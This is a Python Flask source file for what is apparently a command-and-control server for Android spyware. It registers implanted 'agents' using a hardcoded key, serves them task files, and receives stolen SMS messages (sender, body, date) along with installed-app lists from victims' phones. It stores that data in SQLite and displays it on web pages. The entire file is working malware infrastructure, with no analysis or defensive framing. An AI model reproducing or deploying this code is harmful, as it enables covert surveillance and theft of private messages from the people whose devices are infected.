from flask import Flask, request, render_template
from string import ascii_uppercase
from random import choice
import os
import sqlite3
import main
from sqlite3 import Error


app = Flask(__name__)
db_file = "database.db"

##############
# Web Routes #
##############

@app.route("/")
def index():
    sql = "SELECT id FROM agents"
    agents = get_data_sql(sql)
    return render_template("index.html", agents=agents)

@app.route("/sms")
def viewSms():
    sql = "SELECT * FROM sms"
    data_rows, columns = get_data_sql(sql)
    return render_template("sms.html", title="sms", columns=columns, data=data_rows)

@app.route("/app")
def viewApp():
    sql = "SELECT id, package, sourceDir, launchActivity FROM app"
    data_rows, columns = get_data_sql(sql)
    return render_template("app.html", title="Installed apps", columns=columns, data=data_rows)

#############
# C2 Routes #
#############


@app.route("/updog", methods=['GET'])
def updog():
    return ("Whats Up Dog", 200)

@app.route("/reg", methods=['POST'])
def registerAgent():
    """
    Register an agent
    - generate uid
    - add agent to database
    - Respond 200 with the uid
    """
    content = request.get_json(silent=True)
    # print(content) # Do your processing

    if (content.get("key", '') == "Potato"):
        agentId = ''.join(choice(ascii_uppercase) for i in range(6))
        print(f"New agent: {agentId}")

        # Add to active agents
        main.active_agents.append(agentId)

        # Add to database
        sql = "INSERT INTO agents VALUES (?)"
        args = (agentId, )
        writeToDatabase(sql, args)

        return (agentId, 200)
    else:
        return ("\n", 204)
    
@app.route("/task/<id>", methods=['GET'])
def getTask(id):
    if id in main.active_agents:
        if os.path.exists(f"task/{id}"):
            
            with open(f"task/{id}", "r") as f:
                task = f.read()
            
            return(task, 200)
        else:
            return ("\n", 201)
    else:
        return ("\n", 204)

@app.route("/result/<id>", methods=['POST'])
def receiveResult(id):
    if id in main.active_agents:
        content = request.get_json(silent=True)
        print(content) # Do your processing

        code = content["code"]
        if code == "sms":
            return handle_sms(content["data"], id)
        elif code == "app":
            return handle_app(content["data"], id)
        
    else:
        return ("\n", 204)

####################
# Command Handlers #
####################

def handle_sms(content, id):
    print(f"Received SMS data: {content}\n\n")
    clearAgentTasks(id)
    for json_data in content:
        address = json_data.get("address", "")
        body = json_data.get("body", "")
        formatted_date = json_data.get("formatted_date", "")
        messageType = json_data.get("type", "")

        # Save data to database
        sql = "INSERT INTO sms VALUES (?, ?, ?, ?, ?)"
        args = (id, address, body, formatted_date, messageType)
        writeToDatabase(sql, args)
               
    

    return ("Success", 200)

def handle_app(content, id):
    print(f"Received app data: {content}\n\n")
    clearAgentTasks(id)
    for json_data in content:
        package = json_data.get("package", "")
        sourceDir = json_data.get("sourceDir", "")
        launchActivity = json_data.get("launchActivity", "")

        # Save data to database
        sql = "INSERT INTO app VALUES (?, ?, ?, ?)"
        args = (id, package, sourceDir, launchActivity)
        writeToDatabase(sql, args)
    
    
    return ("Success", 200)

####################
# Helper functions #
####################

def clearAgentTasks(id):
    taskFile = f"task/{id}"

    if os.path.exists(taskFile):
        os.remove(taskFile)
    else:
        print(f"[-] No such file found: {taskFile}")

def writeToDatabase(sql, args):
    try:
        conn = sqlite3.connect(db_file)
        conn.execute(sql, args)
        conn.commit()
    except Error as e:
        print(e)
    finally:
        if conn:
            conn.close()

def readFromDatabase(sql, args):
    try:
        conn = sqlite3.connect(db_file)
        rows = conn.execute(sql, args).fetchall()
        if rows.__len__ != 0:
            return rows
        else:
            return None
    except Error as e:
        print(e)
    finally:
        if conn:
            conn.close()

def get_db_connection():
    conn = sqlite3.connect(db_file)
    conn.row_factory = sqlite3.Row
    return conn

def get_data_sql(sql):
    conn = get_db_connection()
    cursor = conn.execute(sql)
    rows = cursor.fetchall()
    names = [description[0] for description in cursor.description]
    conn.close()
    return rows, names

def init_database():
    print("Creating database")
    try:
        conn = sqlite3.connect(db_file)
        sqls = [
            "CREATE TABLE IF NOT EXISTS agents(id TEXT)",
            "CREATE TABLE IF NOT EXISTS sms(id TEXT, address TEXT, body TEXT, formatted_date TEXT, type INT)",
            "CREATE TABLE IF NOT EXISTS app(id TEXT, package TEXT, sourceDir TEXT, launchActivity TEXT)"
        ]

        for sql in sqls:
            conn.execute(sql)

        conn.commit()
    except Error as e:
        print(e)
    finally:
        if conn:
            conn.close()

def run_server():
    init_database()
    import logging
    logging.basicConfig(filename='log',level=logging.DEBUG)

    app.run(host='0.0.0.0', port=443, ssl_context=('keys/cert.pem', 'keys/key2.pem'))
    # app.run(host='0.0.0.0', port=80)

if __name__ == "__main__":
    run_server()